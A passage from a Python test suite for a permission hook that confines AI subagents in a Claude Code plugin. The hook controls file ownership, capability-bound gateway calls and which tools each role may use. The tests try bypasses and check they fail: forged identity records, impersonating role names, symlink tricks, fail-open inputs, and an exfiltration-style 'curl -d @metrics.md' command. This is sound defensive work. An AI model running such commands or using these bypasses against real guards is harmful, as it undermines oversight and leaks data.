            acme.mkdir(parents=True)
            portfolio.mkdir(parents=True)
            home = self._home_with_registry(tmp, (
                "businesses:\n"
                "  acme:\n"
                "    home: %s\n"
                "    status: active\n"
                "portfolio: %s\n" % (acme, portfolio)))
            guard = load_guard()
            with mock.patch.dict(sys.modules, {"yaml": None}), \
                    mock.patch.dict(os.environ, {"HOME": str(home)}):
                roots = guard._registry_roots()
            self.assertEqual(roots, [str(acme), str(portfolio)])

    def test_broken_registry_fails_open(self):
        import tempfile
        from unittest import mock
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            home = self._home_with_registry(tmp, ":\nnot yaml: [unclosed\n")
            guard = load_guard()
            with mock.patch.dict(os.environ, {"HOME": str(home)}):
                self.assertEqual(guard._registry_roots(), [])
                # and the overall resolution still stands on env/cwd guesses
                self.assertTrue(guard.workspace_roots(None))

    def test_cross_owner_write_in_registered_workspace_is_denied(self):
        """FOUNDER_OS_HOME points at business A; the write lands in business B.

        Without the registry the guard would not recognise B as a workspace at
        all and would allow — which is exactly the multi-business hole this
        closes.
        """
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            a = tmp / "a" / "founder-os"
            b = tmp / "b" / "founder-os"
            a.mkdir(parents=True)
            b.mkdir(parents=True)
            (b / "metrics.md").write_text("# metrics\n", encoding="utf-8")
            home = self._home_with_registry(tmp, (
                "businesses:\n"
                "  a:\n"
                "    home: %s\n"
                "    status: active\n"
                "  b:\n"
                "    home: %s\n"
                "    status: active\n"
                "default: a\n" % (a, b)))
            env = {**os.environ,
                   "HOME": str(home),
                   "FOUNDER_OS_HOME": str(a),
                   "CLAUDE_PLUGIN_ROOT": str(PLUGIN_ROOT)}
            payload = {"agent_type": "strategist", "tool_name": "Write",
                       "tool_input": {"file_path": str(b / "metrics.md")},
                       "cwd": str(tmp)}
            r = subprocess.run([sys.executable, str(GUARD_PATH)],
                               input=json.dumps(payload), capture_output=True,
                               text=True, env=env, cwd=str(tmp))
            self.assertIn("deny", r.stdout, r.stderr)


class TestLocalOverlay(unittest.TestCase):
    """The founder's additive overlay (references/extensibility.md).

    Three properties, and the second is the one the whole design exists for:
    the overlay may add a path, it may never take one away, and an overlay the
    guard cannot read is ignored rather than obeyed.
    """

    OVERLAY = (
        "workspace_files:\n"
        "  - partners.md\n"
        "owns:\n"
        "  network-manager:\n"
        "    - partners.md\n"
        "sections:\n"
        "  partners.md:\n"
        "    - \"## Partners\"\n"
    )

    def _workspace(self, tmp, overlay=None, name="founder-os"):
        ws = tmp / name
        (ws / "_local").mkdir(parents=True)
        if overlay is not None:
            (ws / "_local" / "ownership.yaml").write_text(
                overlay, encoding="utf-8")
        return ws

    def _run(self, workspace, payload, home=None):
        env = {**os.environ,
               "FOUNDER_OS_HOME": str(workspace),
               "CLAUDE_PLUGIN_ROOT": str(PLUGIN_ROOT)}
        if home is not None:
            env["HOME"] = str(home)
        return subprocess.run([sys.executable, str(GUARD_PATH)],
                              input=json.dumps(payload), capture_output=True,
                              text=True, env=env, cwd=str(workspace.parent))

    def _write(self, workspace, agent, rel, home=None):
        return self._run(workspace, {
            "agent_type": agent, "tool_name": "Write",
            "cwd": str(workspace.parent),
            "tool_input": {"file_path": str(workspace / rel)}}, home=home)

    def test_overlay_path_is_denied_to_a_non_owner(self):
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            ws = self._workspace(Path(td), self.OVERLAY)
            r = self._write(ws, "cfo", "partners.md")
            self.assertIn("deny", r.stdout, r.stderr)

    def test_overlay_owner_still_uses_the_gateway(self):
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            ws = self._workspace(Path(td), self.OVERLAY)
            r = self._write(ws, "network-manager", "partners.md")
            self.assertIn("deny", r.stdout, r.stderr)
            self.assertEqual(r.returncode, 0)

    def test_overlay_cannot_reassign_a_packaged_path(self):
        """The rule the design exists to make structurally true."""
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            ws = self._workspace(Path(td), (
                "owns:\n"
                "  network-manager:\n"
                "    - metrics.md\n"))
            stolen = self._write(ws, "network-manager", "metrics.md")
            self.assertIn("deny", stolen.stdout, stolen.stderr)
            kept = self._write(ws, "cfo", "metrics.md")
            self.assertIn("deny", kept.stdout, kept.stderr)

    def test_unparseable_overlay_does_not_enable_direct_writes(self):
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            ws = self._workspace(Path(td), ":\nnot yaml: [unclosed\n")
            r = self._write(ws, "cfo", "partners.md")
            self.assertIn("deny", r.stdout, r.stderr)
            still = self._write(ws, "network-manager", "metrics.md")
            self.assertIn("deny", still.stdout)

    def test_overlay_without_a_usable_owns_map_does_not_enable_direct_writes(self):
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            ws = self._workspace(Path(td), "workspace_files:\n  - partners.md\n")
            r = self._write(ws, "cfo", "partners.md")
            self.assertIn("deny", r.stdout, r.stderr)

    def test_one_businesss_overlay_does_not_reach_another(self):
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            a = self._workspace(tmp, self.OVERLAY, name="a")
            b = self._workspace(tmp, None, name="b")
            (b / "partners.md").write_text("# partners\n", encoding="utf-8")
            home = tmp / "home"
            (home / ".founder-os").mkdir(parents=True)
            (home / ".founder-os" / "businesses.yaml").write_text(
                "businesses:\n"
                "  a:\n"
                "    home: %s\n"
                "    status: active\n"
                "  b:\n"
                "    home: %s\n"
                "    status: active\n"
                "default: a\n" % (a, b), encoding="utf-8")
            denied = self._write(a, "cfo", "partners.md", home=home)
            self.assertIn("deny", denied.stdout, denied.stderr)
            also_denied = self._write(b, "cfo", "partners.md", home=home)
            self.assertIn("deny", also_denied.stdout, also_denied.stderr)

    def test_overlay_is_read_once_per_root(self):
        # Stated as behaviour: an overlay rewritten between two reads in one
        # invocation is not read again, so both answers come from one file.
        guard = load_guard()
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            ws = self._workspace(Path(td), self.OVERLAY)
            first = guard.local_ownership(str(ws))
            (ws / "_local" / "ownership.yaml").write_text(
                "owns:\n  cfo:\n    - other.md\n", encoding="utf-8")
            second = guard.local_ownership(str(ws))
        self.assertEqual(first, {"partners.md": "network-manager"})
        self.assertEqual(second, first)


class TestLocalMapIsNotAgentWritable(unittest.TestCase):
    """No subagent edits the map that governs it."""

    def _workspace(self, tmp):
        ws = tmp / "founder-os"
        (ws / "_local" / "skills" / "local-thing").mkdir(parents=True)
        return ws

    def _run(self, ws, payload):
        env = {**os.environ,
               "FOUNDER_OS_HOME": str(ws),
               "CLAUDE_PLUGIN_ROOT": str(PLUGIN_ROOT)}
        return subprocess.run([sys.executable, str(GUARD_PATH)],
                              input=json.dumps(payload), capture_output=True,
                              text=True, env=env, cwd=str(ws.parent))

    def test_subagent_cannot_write_the_overlay_map(self):
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            ws = self._workspace(Path(td))
            r = self._run(ws, {
                "agent_type": "ops-engineer", "tool_name": "Write",
                "cwd": str(ws.parent),
                "tool_input": {
                    "file_path": str(ws / "_local" / "ownership.yaml")}})
            self.assertIn("deny", r.stdout, r.stderr)

    def test_the_deny_covers_the_whole_directory_not_just_the_map(self):
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            ws = self._workspace(Path(td))
            r = self._run(ws, {
                "agent_type": "brand-editor", "tool_name": "Write",
                "cwd": str(ws.parent),
                "tool_input": {"file_path": str(
                    ws / "_local" / "skills" / "local-thing" / "SKILL.md")}})
            self.assertIn("deny", r.stdout, r.stderr)

    def test_a_symlinked_local_dir_is_still_the_overlay(self):
        # security-6 - `_local` symlinked at a sibling directory resolved to
        # the sibling's name, so only the literal spelling names the overlay.
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            ws = Path(td) / "founder-os"
            (ws / "config").mkdir(parents=True)
            (ws / "_local").symlink_to(ws / "config")
            r = self._run(ws, {
                "agent_type": "general-purpose", "tool_name": "Write",
                "cwd": str(ws.parent),
                "tool_input": {
                    "file_path": str(ws / "_local" / "ownership.yaml")}})
            self.assertIn("deny", r.stdout, r.stderr)
            self.assertIn("overlay", r.stdout)

    def test_the_founder_may_write_it_on_the_main_thread(self):
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            ws = self._workspace(Path(td))
            r = self._run(ws, {
                "tool_name": "Write", "cwd": str(ws.parent),
                "tool_input": {
                    "file_path": str(ws / "_local" / "ownership.yaml")}})
            self.assertEqual(r.stdout.strip(), "", r.stderr)


class TestGatewayCapabilityBoundary(unittest.TestCase):
    """The guard permits only a capability-bound local gateway path."""

    def _issue_capability(self, data_root, role="cfo",
                          workflow="revenue-review"):
        sys.path.insert(0, str(PLUGIN_ROOT))
        try:
            from mcp.sessions import RoleSessionStore
        finally:
            sys.path.pop(0)
        store = RoleSessionStore(
            data_root=Path(data_root) / "state-gateway",
            packaged_root=PLUGIN_ROOT,
            clock=time.time,
            ttl_seconds=300.0,
        )
        return store.open(
            workspace_id="workspace-1",
            role=role,
            correlation_id="corr-1",
            workflow=workflow,
            workspace_kind="business",
        )

    def _deny_payload(self, result):
        self.assertTrue(result.stdout, result.stderr)
        payload = json.loads(result.stdout)
        output = payload["hookSpecificOutput"]
        self.assertEqual(output["hookEventName"], "PreToolUse")
        self.assertEqual(output["permissionDecision"], "deny")
        self.assertTrue(output["permissionDecisionReason"])

    def _gateway_call(self, capability, data_root, agent_type="cfo"):
        return run_hook_with_data(
            {
                "agent_type": agent_type,
                "tool_name": "mcp__founder-os-state__read_state",
                "cwd": str(REPO_ROOT),
                "tool_input": {
                    "capability": capability,
                    "paths": ["metrics.md"],
                },
            },
            data_root,
        )

    def test_claude_role_can_call_known_gateway_with_its_capability(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            capability = self._issue_capability(temp_dir)
            result = run_hook_with_data(
                {
                    "agent_type": "cfo",
                    "tool_name": "mcp__founder-os-state__read_state",
                    "cwd": str(REPO_ROOT),
                    "tool_input": {
                        "capability": capability,
                        "paths": ["metrics.md"],
                    },
                },
                temp_dir,
            )
        self.assertEqual(result.stdout, "", result.stderr)

    def test_unknown_gateway_tool_is_denied(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            capability = self._issue_capability(temp_dir)
            result = run_hook_with_data(
                {
                    "agent_type": "cfo",
                    "tool_name": "mcp__founder-os-state__delete_state",
                    "cwd": str(REPO_ROOT),
                    "tool_input": {"capability": capability},
                },
                temp_dir,
            )
        self._deny_payload(result)

    def test_subagent_cannot_open_its_own_role_session(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            result = run_hook_with_data(
                {
                    "agent_type": "cfo",
                    "tool_name": (
                        "mcp__founder-os-state__open_role_session"
                    ),
                    "cwd": str(REPO_ROOT),
                    "tool_input": {"role": "cfo"},
                },
                temp_dir,
            )
        self._deny_payload(result)

    def test_role_bound_gateway_call_requires_a_live_capability(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            result = run_hook_with_data(
                {
                    "agent_type": "cfo",
                    "tool_name": "mcp__founder-os-state__read_state",
                    "cwd": str(REPO_ROOT),
                    "tool_input": {"paths": ["metrics.md"]},
                },
                temp_dir,
            )
        self._deny_payload(result)

    def test_unencodable_capability_cannot_trigger_the_outer_fail_open(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            result = run_hook_with_data(
                {
                    "agent_type": "cfo",
                    "tool_name": "mcp__founder-os-state__read_state",
                    "cwd": str(REPO_ROOT),
                    "tool_input": {
                        "capability": "\ud800",
                        "paths": ["metrics.md"],
                    },
                },
                temp_dir,
            )
        self._deny_payload(result)

    def test_malformed_tool_name_cannot_trigger_the_outer_fail_open(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            result = run_hook_with_data(
                {
                    "agent_type": "cfo",
                    "tool_name": ["mcp__founder-os-state__read_state"],
                    "cwd": str(REPO_ROOT),
                    "tool_input": {},
                },
                temp_dir,
            )
        self._deny_payload(result)

    def test_clock_failure_invalidates_capability_instead_of_escaping(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            capability = self._issue_capability(temp_dir)
            guard = load_guard()
            with mock.patch.dict(
                os.environ,
                {"CLAUDE_PLUGIN_DATA": temp_dir},
                clear=False,
            ), mock.patch.object(
                guard.time,
                "time",
                side_effect=OSError("clock unavailable"),
            ):
                role = guard._session_role({"capability": capability})

        self.assertIsNone(role)

    def test_every_malformed_persisted_session_shape_is_denied(self):
        mutations = (
            ("closed", lambda record: record.update(status="closed")),
            ("expired", lambda record: record.update(expires_at=0)),
            (
                "wrong hash",
                lambda record: record.update(capability_hash="0" * 64),
            ),
            ("extra field", lambda record: record.update(extra=True)),
            ("blank workspace", lambda record: record.update(workspace_id="")),
            ("unknown workspace kind", lambda record: record.update(workspace_kind="team")),
            (
                "blank correlation",
                lambda record: record.update(correlation_id=""),
            ),
            ("blank workflow", lambda record: record.update(workflow="")),
            ("unknown role", lambda record: record.update(role="unknown")),
        )
        for label, mutate in mutations:
            with self.subTest(label=label), tempfile.TemporaryDirectory() as temp_dir:
                capability = self._issue_capability(temp_dir)
                digest = hashlib.sha256(capability.encode("utf-8")).hexdigest()
                record_path = (
                    Path(temp_dir) / "state-gateway" / (digest + ".json")
                )
                record = json.loads(record_path.read_text(encoding="utf-8"))
                mutate(record)
                record_path.write_text(json.dumps(record), encoding="utf-8")

                result = self._gateway_call(capability, temp_dir)

                self._deny_payload(result)

    def test_unsafe_or_oversized_session_record_is_denied(self):
        for shape in ("oversized", "symlink", "directory"):
            with self.subTest(shape=shape), tempfile.TemporaryDirectory() as temp_dir:
                capability = self._issue_capability(temp_dir)
                digest = hashlib.sha256(capability.encode("utf-8")).hexdigest()
                record_path = (
                    Path(temp_dir) / "state-gateway" / (digest + ".json")
                )
                if shape == "oversized":
                    record_path.write_text(" " * (16 * 1024 + 1), encoding="utf-8")
                else:
                    saved = record_path.with_suffix(".saved")
                    record_path.replace(saved)
                    if shape == "symlink":
                        record_path.symlink_to(saved)
                    else:
                        record_path.mkdir()

                result = self._gateway_call(capability, temp_dir)

                self._deny_payload(result)

    def test_native_role_must_match_capability_role(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            capability = self._issue_capability(temp_dir, role="cfo")
            result = run_hook_with_data(
                {
                    "agent_type": "strategist",
                    "tool_name": "mcp__founder-os-state__read_state",
                    "cwd": str(REPO_ROOT),
                    "tool_input": {
                        "capability": capability,
                        "paths": ["metrics.md"],
                    },
                },
                temp_dir,
            )
        self._deny_payload(result)

    def test_generic_fallback_uses_the_capability_role(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            capability = self._issue_capability(temp_dir, role="cfo")
            result = run_hook_with_data(
                {
                    "agent_type": "default",
                    "tool_name": "mcp__founder-os-state__read_state",
                    "cwd": str(REPO_ROOT),
                    "tool_input": {
                        "capability": capability,
                        "paths": ["metrics.md"],
                    },
                },
                temp_dir,
            )
        self.assertEqual(result.stdout, "", result.stderr)

    def test_role_call_under_the_normalized_server_name_is_allowed(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            capability = self._issue_capability(temp_dir, role="cfo")
            result = run_hook_with_data(
                {
                    "agent_type": "cfo",
                    "tool_name": (
                        "mcp__founder_os_state__write_owned_state"
                    ),
                    "cwd": str(REPO_ROOT),
                    "tool_input": {
                        "capability": capability,
                        "path": "metrics.md",
                        "content": "# Metrics\n",
                        "create_only": True,
                    },
                },
                temp_dir,
            )
        self.assertEqual(result.stdout, "", result.stderr)

    def test_roles_are_denied_direct_tools_and_non_gateway_mcp(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            for tool_name, tool_input in (
                ("Bash", {"command": "pwd"}),
                ("WebFetch", {"url": "https://example.test"}),
                ("WebSearch", {"query": "founder os"}),
                (
                    "Read",
                    {"file_path": str(PLUGIN_ROOT / "metrics.md")},
                ),
                ("Glob", {"pattern": "**/*.md"}),
                ("Grep", {"pattern": "secret"}),
                (
                    "Write",
                    {
                        "file_path": str(PLUGIN_ROOT / "metrics.md"),
                        "content": "x",
                    },
                ),
                (
                    "Edit",
                    {
                        "file_path": str(PLUGIN_ROOT / "metrics.md"),
                        "old_string": "x",
                        "new_string": "y",
                    },
                ),
                ("NotebookEdit", {"notebook_path": "x.ipynb"}),
                ("mcp__other__anything", {}),
            ):
                with self.subTest(tool_name=tool_name):
                    result = run_hook_with_data(
                        {
                            "agent_type": "cfo",
                            "tool_name": tool_name,
                            "cwd": str(REPO_ROOT),
                            "tool_input": tool_input,
                        },
                        temp_dir,
                    )
                    self._deny_payload(result)

    def test_another_plugins_agent_named_like_a_role_cannot_use_the_gateway(self):
        # `cfo` and `strategist` are ordinary agent names, so a second
        # installed plugin shipping one arrives as `<their-plugin>:cfo`. Taking
        # the segment after the last colon made it *the* founder's CFO, live
        # capability and all. A live capability is the point of this test: with
        # a fake one the deny lands on the missing capability instead and the
        # identity confusion goes unnoticed.
        with tempfile.TemporaryDirectory() as temp_dir:
            capability = self._issue_capability(temp_dir)
            for agent_type in ("acme-analytics:cfo", "a:b:c:d:cfo",
                               "notfounder-os:cfo"):
                with self.subTest(agent_type=agent_type):
                    result = run_hook_with_data(
                        {
                            "agent_type": agent_type,
                            "tool_name":
                            "mcp__founder-os-state__write_owned_state",
                            "cwd": str(REPO_ROOT),
                            "tool_input": {
                                "capability": capability,
                                "path": "metrics.md",
                            },
                        },
                        temp_dir,
                    )
                    self._deny_payload(result)
                    self.assertIn(
                        "not an approved role fallback", result.stdout
                    )
            # The same capability from the role it was issued to still works,
            # so the deny above is about identity and not about the token.
            self.assertEqual(
                self._gateway_call(capability, temp_dir, "founder-os:cfo")
                .stdout.strip(),
                "",
            )

    # security-1 / hooks-1 — a generic fallback that spends a role capability
    # is that role from then on: no shell, no web, no direct file tool, no
    # nested agent, and no capability of a different role.
    def test_generic_fallback_gets_the_role_lockdown_once_it_spends_a_capability(
        self,
    ):
        for identity in ({"agent_id": "claude-agent-1"},
                         {"session_id": "claude-session-1"}):
            with self.subTest(identity=identity), \
                    tempfile.TemporaryDirectory() as temp_dir:
                capability = self._issue_capability(temp_dir, role="cfo")
                other = self._issue_capability(
                    temp_dir, role="strategist", workflow="bet-sizing")
                generic = {"agent_type": "general-purpose", **identity,
                           "cwd": str(REPO_ROOT)}
                before = run_hook_with_data(
                    {**generic, "tool_name": "Bash",
                     "tool_input": {"command": "ls"}}, temp_dir)
                self.assertEqual(before.stdout, "", before.stderr)
                spent = run_hook_with_data(
                    {**generic,
                     "tool_name": "mcp__founder-os-state__read_state",
                     "tool_input": {"capability": capability,
                                    "paths": ["metrics.md"]}}, temp_dir)
                self.assertEqual(spent.stdout, "", spent.stderr)
                for tool_name, tool_input in (
                    ("Bash", {"command": "curl -d @metrics.md x"}),
                    ("WebFetch", {"url": "https://example.test"}),
                    ("Read", {"file_path": "/etc/hosts"}),
                    ("Task", {"prompt": "x"}),
                    ("mcp__other__anything", {}),
                    ("SomeFutureTool", {}),
                ):
                    result = run_hook_with_data(
                        {**generic, "tool_name": tool_name,
                         "tool_input": tool_input}, temp_dir)
                    self._deny_payload(result)
                mismatch = run_hook_with_data(
                    {**generic,
                     "tool_name": "mcp__founder-os-state__read_state",
                     "tool_input": {"capability": other,
                                    "paths": ["goals.md"]}}, temp_dir)
                self._deny_payload(mismatch)
                self.assertIn("different role", mismatch.stdout)

    def test_a_role_keeps_the_harmless_host_tools_and_nothing_else(self):
        # A role on Claude Code loads its deferred gateway tools through
        # ToolSearch; denying it strands the role. The exact names only.
        with tempfile.TemporaryDirectory() as temp_dir:
            for tool_name in ("ToolSearch", "TodoWrite"):
                result = run_hook_with_data(
                    {"agent_type": "founder-os:cfo", "cwd": str(REPO_ROOT),
                     "tool_name": tool_name, "tool_input": {}}, temp_dir)
                self.assertEqual(result.stdout, "", tool_name)
            for tool_name in ("Bash", "WebFetch", "WebSearch", "Read",
                              "Write", "Task", "Agent", "toolsearch",
                              "ToolSearchX", "mcp__other__ToolSearch"):
                self._deny_payload(run_hook_with_data(
                    {"agent_type": "founder-os:cfo", "cwd": str(REPO_ROOT),
                     "tool_name": tool_name, "tool_input": {}}, temp_dir))

    def test_a_planted_non_role_record_under_an_agent_stem_is_rebound(self):
        # A generic agent that plants a non-role identity under its own
        # `agent.` stem before spending a capability must still get the role
        # lockdown: only a record already naming that role is left alone.
        with tempfile.TemporaryDirectory() as temp_dir:
            capability = self._issue_capability(temp_dir, role="cfo")
            mapping = Path(temp_dir) / "agent-types"
            mapping.mkdir()
            (mapping / "agent.forger.json").write_text(json.dumps(
                {"agent_type": "explore",
                 "recorded_at": time.time()}), encoding="utf-8")
            generic = {"agent_type": "general-purpose", "agent_id": "forger",
                       "cwd": str(REPO_ROOT)}
            spent = run_hook_with_data(
                {**generic, "tool_name": "mcp__founder-os-state__read_state",
                 "tool_input": {"capability": capability,
                                "paths": ["metrics.md"]}}, temp_dir)
            self.assertEqual(spent.stdout, "", spent.stderr)
            self._deny_payload(run_hook_with_data(
                {**generic, "tool_name": "Bash",
                 "tool_input": {"command": "ls"}}, temp_dir))

    def test_another_generic_agent_is_not_locked_by_a_sibling_binding(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            capability = self._issue_capability(temp_dir, role="cfo")
            run_hook_with_data({"agent_type": "general-purpose",
                            "agent_id": "holder", "cwd": str(REPO_ROOT),
                            "tool_name": "mcp__founder-os-state__read_state",
                            "tool_input": {"capability": capability,
                                           "paths": ["metrics.md"]}},
                           temp_dir)
            reviewer = run_hook_with_data({"agent_type": "general-purpose",
                                       "agent_id": "reviewer",
                                       "cwd": str(REPO_ROOT),
                                       "tool_name": "Bash",
                                       "tool_input": {"command": "ls"}},
                                      temp_dir)
        self.assertEqual(reviewer.stdout, "", reviewer.stderr)

    def test_generic_capability_is_denied_when_the_binding_cannot_persist(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            capability = self._issue_capability(temp_dir, role="cfo")
            (Path(temp_dir) / "agent-types").write_text("", encoding="utf-8")
            result = run_hook_with_data(
                {"agent_type": "default", "agent_id": "generic-1",
                 "cwd": str(REPO_ROOT),
                 "tool_name": "mcp__founder-os-state__read_state",
                 "tool_input": {"capability": capability,
                                "paths": ["metrics.md"]}}, temp_dir)
        self._deny_payload(result)
        self.assertIn("could not be bound", result.stdout)

    def test_an_unreadable_binding_fails_closed(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            mapping = Path(temp_dir) / "agent-types"
            mapping.mkdir()
            (mapping / "agent.holder.json").write_text("{", encoding="utf-8")
            result = run_hook_with_data(
                {"agent_type": "general-purpose", "agent_id": "holder",
                 "cwd": str(REPO_ROOT), "tool_name": "Bash",
                 "tool_input": {"command": "ls"}}, temp_dir)
        self._deny_payload(result)

    def test_an_expired_binding_unbinds_rather_than_denies(self):
        # Nothing prunes Claude-side bindings, so an expired one must not
        # lock the agent (or a whole session) out forever.
        with tempfile.TemporaryDirectory() as temp_dir:
            mapping = Path(temp_dir) / "agent-types"
            mapping.mkdir()
            (mapping / "agent.old.json").write_text(json.dumps(
                {"agent_type": "cfo", "recorded_at": time.time() - 86401}),
                encoding="utf-8")
            result = run_hook_with_data(
                {"agent_type": "general-purpose", "agent_id": "old",
                 "cwd": str(REPO_ROOT), "tool_name": "Bash",
                 "tool_input": {"command": "ls"}}, temp_dir)
        self.assertEqual(result.stdout, "", result.stderr)

    def test_guard_finds_sessions_under_the_gateways_fallback_data_root(self):
        # hooks-2 — with neither PLUGIN_DATA nor CLAUDE_PLUGIN_DATA set, the
        # gateway keeps sessions under ~/.founder-os/plugin-data; the guard
        # must read the same directory.
        with tempfile.TemporaryDirectory() as temp_dir:
            data_root = Path(temp_dir) / ".founder-os" / "plugin-data"
            capability = self._issue_capability(data_root, role="cfo")
            env = {key: value for key, value in os.environ.items()
                   if key != "CLAUDE_PLUGIN_DATA"}
            env.update(HOME=temp_dir, FOUNDER_OS_HOME=str(PLUGIN_ROOT),
                       CLAUDE_PLUGIN_ROOT=str(PLUGIN_ROOT))
            result = subprocess.run(
                [sys.executable, str(GUARD_PATH)],
                input=json.dumps({
                    "agent_type": "founder-os:cfo", "cwd": str(REPO_ROOT),
                    "tool_name": "mcp__founder-os-state__read_state",
                    "tool_input": {"capability": capability,
                                   "paths": ["metrics.md"]}}),
                capture_output=True, text=True, env=env, cwd=str(REPO_ROOT))
        self.assertEqual(result.stdout, "", result.stderr)

    def test_role_names_match_the_packaged_agents(self):
        # deadcode-5 — a role missing here is no role to the lockdown.
        self.assertEqual(
            load_guard().ROLE_NAMES,
            {path.stem for path in (PLUGIN_ROOT / "agents").glob("*.md")},
        )

    def test_session_fields_match_the_gateways_record(self):
        # HOOK-06 — `_session_role` refuses any record whose keys differ, so a
        # field the gateway adds would deny every role's gateway call.
        sys.path.insert(0, str(PLUGIN_ROOT))
        try:
            from mcp import sessions
        finally:
            sys.path.pop(0)
        self.assertEqual(load_guard().SESSION_FIELDS,
                         sessions._BASE_RECORD_FIELDS)


class TestGuardFilesAreNotAgentWritable(unittest.TestCase):
    """SEC-02: the files that define the guard sit outside every workspace.

    The plugin root, the plugin data root and the business registry are not
    workspace files, so the outside-the-workspace allow used to cover them.
    """

    def _run(self, rel_or_path, agent_type="explore", tool_name="Edit"):
        tmp = Path(tempfile.mkdtemp()).resolve()
        self.addCleanup(shutil.rmtree, str(tmp), True)
        ws, data, home = tmp / "ws", tmp / "data", tmp / "home"
        for directory in (ws, data / "state-gateway", home / ".founder-os"):
            directory.mkdir(parents=True)
        target = {"plugin": PLUGIN_ROOT / "references" / "ownership.yaml",
                  "hook": PLUGIN_ROOT / "hooks" / "ownership-guard.py",
                  "agent": PLUGIN_ROOT / "agents" / "cfo.md",
                  "session": data / "state-gateway" / ("0" * 64 + ".json"),
                  "binding": data / "agent-types" / "agent.x.json",
                  "registry": home / ".founder-os" / "businesses.yaml",
                  "registry-link": tmp / "link.yaml",
                  "outside": tmp / "elsewhere.md"}[rel_or_path]
        if rel_or_path == "registry-link":
            target.symlink_to(home / ".founder-os" / "businesses.yaml")
        env = {**os.environ, "FOUNDER_OS_HOME": str(ws), "HOME": str(home),
               "CLAUDE_PLUGIN_ROOT": str(PLUGIN_ROOT),
               "CLAUDE_PLUGIN_DATA": str(data)}
        payload = {"tool_name": tool_name, "cwd": str(tmp),
                   "tool_input": {"file_path": str(target)}}
        if agent_type is not None:
            payload["agent_type"] = agent_type
        return subprocess.run([sys.executable, str(GUARD_PATH)],
                              input=json.dumps(payload), capture_output=True,
                              text=True, env=env, cwd=str(tmp))

    def test_a_non_role_agent_may_not_write_a_guard_file(self):
        for target in ("plugin", "hook", "agent", "session", "binding",
                       "registry", "registry-link"):
            for tool_name in ("Write", "Edit"):
                with self.subTest(target=target, tool_name=tool_name):
                    p = self._run(target, tool_name=tool_name)
                    self.assertIn("deny", p.stdout, p.stderr)
                    self.assertIn("defines the Founder OS guard", p.stdout)
                    self.assertEqual(p.returncode, 0)

    def test_a_generic_agent_is_denied_too(self):
        p = self._run("session", agent_type="general-purpose", tool_name="Write")
        self.assertIn("defines the Founder OS guard", p.stdout, p.stderr)

    def test_the_main_thread_is_unaffected(self):
        for target in ("plugin", "session", "registry"):
            with self.subTest(target=target):
                p = self._run(target, agent_type=None)
                self.assertEqual(p.stdout.strip(), "", p.stdout)
                self.assertEqual(p.returncode, 0)

    def test_an_ordinary_path_outside_the_workspace_is_still_allowed(self):
        p = self._run("outside", tool_name="Write")
        self.assertEqual(p.stdout.strip(), "", p.stdout)
        self.assertEqual(p.returncode, 0)


class TestHostRuntimeShapes(unittest.TestCase):
    """The guard must speak the shapes the host actually sends.

    Claude Code registers plugin MCP tools as
    ``mcp__plugin_founder-os_founder-os-state__<action>`` and identifies plugin
    subagents as ``<plugin>:<agent>`` (``founder-os:cfo``). The 2026-07-30 audit
    (CFG-001/CFG-002) found the guard only understood the bare fixtures below,
    which never occur on Claude Code at runtime: every non-role subagent was
    locked out of every tool, and the roles were locked out of their own
    gateway.
    """

    PREFIXED_RESOLVE = "mcp__plugin_founder-os_founder-os-state__resolve_workspace"

    # CFG-001 — subagents that are not Founder OS roles are outside the
    # gateway lockdown. Only the overlay and the ownership map bind them.
    def test_general_purpose_read_is_allowed(self):
        p = run_hook({"agent_type": "general-purpose", "tool_name": "Read",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {"file_path": "/etc/hosts"}})
        self.assertEqual(p.stdout.strip(), "")
        self.assertEqual(p.returncode, 0)

    def test_explore_bash_is_allowed(self):
        p = run_hook({"agent_type": "Explore", "tool_name": "Bash",
                      "cwd": str(REPO_ROOT), "tool_input": {"command": "ls"}})
        self.assertEqual(p.stdout.strip(), "")

    def test_namespaced_reviewer_read_is_allowed(self):
        p = run_hook({"agent_type": "solkova-core:code-reviewer",
                      "tool_name": "Read", "cwd": str(REPO_ROOT),
                      "tool_input": {"file_path": "/etc/hosts"}})
        self.assertEqual(p.stdout.strip(), "")

    def test_foreign_mcp_by_non_role_is_allowed(self):
        p = run_hook({"agent_type": "general-purpose",
                      "tool_name": "mcp__plugin_posthog_posthog__exec",
                      "cwd": str(REPO_ROOT), "tool_input": {}})
        self.assertEqual(p.stdout.strip(), "")

    def test_non_role_write_to_owned_file_names_the_owner(self):
        p = run_hook({"agent_type": "general-purpose", "tool_name": "Write",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {"file_path": str(PLUGIN_ROOT / "goals.md")}})
        self.assertIn("deny", p.stdout)
        self.assertIn("strategist", p.stdout)

    def test_non_role_write_under_local_is_denied(self):
        p = run_hook({"agent_type": "general-purpose", "tool_name": "Write",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {"file_path":
                                     str(PLUGIN_ROOT / "_local" / "ownership.yaml")}})
        self.assertIn("deny", p.stdout)

    # CFG-002 — a namespaced role identity is that role, locked down as before.
    def test_namespaced_role_read_is_denied(self):
